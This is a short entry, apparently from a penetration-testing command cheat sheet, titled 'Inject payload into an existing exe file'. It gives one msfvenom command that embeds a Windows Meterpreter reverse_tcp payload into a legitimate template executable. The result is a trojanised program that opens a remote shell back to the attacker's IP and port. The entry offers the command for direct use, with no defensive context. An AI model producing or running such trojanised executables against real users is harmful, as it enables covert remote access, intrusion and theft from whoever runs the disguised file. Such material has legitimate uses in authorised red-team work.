---
id: 76f983f8-0d59-443c-bbcb-1a094c726281
name: Inject payload into an existing exe file
type: command
executor: bash
data: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -x <template EXE> -f exe > <output.exe>

  '
output: null
created_at: '2020-07-14T18:14:34.235125+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Inject payload into an existing exe file

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -x <template EXE> -f exe > <output.exe>

```


